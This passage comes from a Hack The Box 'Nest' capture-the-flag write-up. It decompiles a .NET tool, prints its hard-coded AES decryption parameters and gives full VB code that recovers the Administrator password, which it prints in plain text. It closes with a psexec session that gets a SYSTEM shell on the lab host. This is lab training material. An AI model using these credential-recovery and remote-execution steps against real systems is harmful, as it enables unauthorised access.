Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
```

Let's just confirm that the executable found earlier is indeed the same:

```aaa
┌─[baud@parrot]─[~/HTB/nest]
└──╼ $ls -la 'AD Integration Module/'
total 20
drwxr-xr-x 1 baud baud    22 Feb 25 03:24 .
drwxr-xr-x 1 baud baud   680 Feb 25 14:03 ..
-rwxr-xr-x 1 baud baud 17408 Feb 25 03:24 HqkLdap.exe
```

---

## VB analysis and decryption program #2

The name matches, so I send it to my Windows box to open it with DnSpy to see if like the other one it was written in .NET, and sure enough the decompiler has no problem reconstructing an accurate version of the source code:

![img](/images/writeup-nest/5.png)

Just like the previous VB program, this one has functions for the encryption and decryption of a password:

```vb
' Token: 0x06000014 RID: 20 RVA: 0x000022E8 File Offset: 0x000006E8
Private Shared Function RE(plainText As String, passPhrase As String, saltValue As String, passwordIterations As Integer, initVector As String, keySize As Integer) As String
			Dim bytes As Byte() = Encoding.ASCII.GetBytes(initVector)
			Dim bytes2 As Byte() = Encoding.ASCII.GetBytes(saltValue)
			Dim bytes3 As Byte() = Encoding.ASCII.GetBytes(plainText)
			Dim rfc2898DeriveBytes As Rfc2898DeriveBytes = New Rfc2898DeriveBytes(passPhrase, bytes2, passwordIterations)
			Dim bytes4 As Byte() = rfc2898DeriveBytes.GetBytes(CInt(Math.Round(CDbl(keySize) / 8.0)))
			Dim transform As ICryptoTransform = New AesCryptoServiceProvider() With { .Mode = CipherMode.CBC }.CreateEncryptor(bytes4, bytes)
			Dim result As String
			Using memoryStream As MemoryStream = New MemoryStream()
				Using cryptoStream As CryptoStream = New CryptoStream(memoryStream, transform, CryptoStreamMode.Write)
					cryptoStream.Write(bytes3, 0, bytes3.Length)
					cryptoStream.FlushFinalBlock()
					Dim inArray As Byte() = memoryStream.ToArray()
					memoryStream.Close()
					cryptoStream.Close()
					result = Convert.ToBase64String(inArray)
				End Using
			End Using
			Return result
		End Function

		' Token: 0x06000015 RID: 21 RVA: 0x000023DC File Offset: 0x000007DC
		Private Shared Function RD(cipherText As String, passPhrase As String, saltValue As String, passwordIterations As Integer, initVector As String, keySize As Integer) As String
			Dim bytes As Byte() = Encoding.ASCII.GetBytes(initVector)
			Dim bytes2 As Byte() = Encoding.ASCII.GetBytes(saltValue)
			Dim array As Byte() = Convert.FromBase64String(cipherText)
			Dim rfc2898DeriveBytes As Rfc2898DeriveBytes = New Rfc2898DeriveBytes(passPhrase, bytes2, passwordIterations)
			Dim bytes3 As Byte() = rfc2898DeriveBytes.GetBytes(CInt(Math.Round(CDbl(keySize) / 8.0)))
			Dim transform As ICryptoTransform = New AesCryptoServiceProvider() With { .Mode = CipherMode.CBC }.CreateDecryptor(bytes3, bytes)
			Dim memoryStream As MemoryStream = New MemoryStream(array)
			Dim cryptoStream As CryptoStream = New CryptoStream(memoryStream, transform, CryptoStreamMode.Read)
			Dim array2 As Byte() = New Byte(array.Length + 1 - 1) {}
			Dim count As Integer = cryptoStream.Read(array2, 0, array2.Length)
			memoryStream.Close()
			cryptoStream.Close()
			Return Encoding.ASCII.GetString(array2, 0, count)
		End Function
```

And the wrappers with hard-coded parameters:

```vb
' Token: 0x06000012 RID: 18 RVA: 0x00002278 File Offset: 0x00000678
Public Shared Function DS(EncryptedString As String) As String
			If String.IsNullOrEmpty(EncryptedString) Then
				Return String.Empty
			End If
			Return CR.RD(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256)
		End Function

		' Token: 0x06000013 RID: 19 RVA: 0x000022B0 File Offset: 0x000006B0
		Public Shared Function ES(PlainString As String) As String
			If String.IsNullOrEmpty(PlainString) Then
				Return String.Empty
			End If
			Return CR.RE(PlainString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256)
		End Function
```

So I just updated my program with the two new decryption functions and made it output the Administrator's password as well:

![img](/images/writeup-nest/6.png)

This is the full code of the decryption program:

```vb
Imports System
Imports System.Text
Imports System.Security.Cryptography
Imports System.IO

Module Program
    Public Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Function Decrypt(ByVal cipherText As String,
                                   ByVal passPhrase As String,
                                   ByVal saltValue As String,
                                    ByVal passwordIterations As Integer,
                                   ByVal initVector As String,
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)

        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

        Dim cipherTextBytes As Byte()
        cipherTextBytes = Convert.FromBase64String(cipherText)

        Dim password As New Rfc2898DeriveBytes(passPhrase,
                                           saltValueBytes,
                                           passwordIterations)

        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))

        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC

        Dim decryptor As ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

        Dim memoryStream As IO.MemoryStream
        memoryStream = New IO.MemoryStream(cipherTextBytes)

        Dim cryptoStream As CryptoStream
        cryptoStream = New CryptoStream(memoryStream,
                                        decryptor,
                                        CryptoStreamMode.Read)

        Dim plainTextBytes As Byte()
        ReDim plainTextBytes(cipherTextBytes.Length)

        Dim decryptedByteCount As Integer
        decryptedByteCount = cryptoStream.Read(plainTextBytes,
                                               0,
                                               plainTextBytes.Length)

        memoryStream.Close()
        cryptoStream.Close()

        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes,
                                            0,
                                            decryptedByteCount)

        Return plainText
    End Function

    Private Function DS(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        End If
        Return RD(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256)
    End Function

    Private Function RD(cipherText As String, passPhrase As String, saltValue As String, passwordIterations As Integer, initVector As String, keySize As Integer) As String
        Dim bytes As Byte() = Encoding.ASCII.GetBytes(initVector)
        Dim bytes2 As Byte() = Encoding.ASCII.GetBytes(saltValue)
        Dim array As Byte() = Convert.FromBase64String(cipherText)
        Dim rfc2898DeriveBytes As Rfc2898DeriveBytes = New Rfc2898DeriveBytes(passPhrase, bytes2, passwordIterations)
        Dim bytes3 As Byte() = rfc2898DeriveBytes.GetBytes(CInt(Math.Round(CDbl(keySize) / 8.0)))
        Dim transform As ICryptoTransform = New AesCryptoServiceProvider() With {.Mode = CipherMode.CBC}.CreateDecryptor(bytes3, bytes)
        Dim memoryStream As MemoryStream = New MemoryStream(array)
        Dim cryptoStream As CryptoStream = New CryptoStream(memoryStream, transform, CryptoStreamMode.Read)
        Dim array2 As Byte() = New Byte(array.Length + 1 - 1) {}
        Dim count As Integer = cryptoStream.Read(array2, 0, array2.Length)
        memoryStream.Close()
        cryptoStream.Close()
        Return Encoding.ASCII.GetString(array2, 0, count)
    End Function

    Sub Main(args As String())
        Console.WriteLine("----- HackTheBox Nest Decryption program by Baud -----")
        Console.WriteLine("Clear text c.smith password: " + DecryptString("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE="))
        Console.WriteLine("Clear text Administrator password: " + DS("yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4="))
        Console.ReadLine()
    End Sub
End Module
```

So the last credentials were found:

```aaa
User: Administrator
Pass: XtH4nkS4Pl4y1nGX
```

---

## Second flag: psexec

Having the Administrator's password and SMB open means I can get a SYSTEM shell using psexec via one of its many implementations, I personally like using impacket's version:

```aaa
┌─[baud@parrot]─[~/HTB/nest]
└──╼ $/opt/impacket/examples/psexec.py Administrator@10.10.10.178
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.178.....
[*] Found writable share ADMIN$
[*] Uploading file SynbiakP.exe
[*] Opening SVCManager on 10.10.10.178.....
[*] Creating service eUDv on 10.10.10.178.....
[*] Starting service eUDv.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```




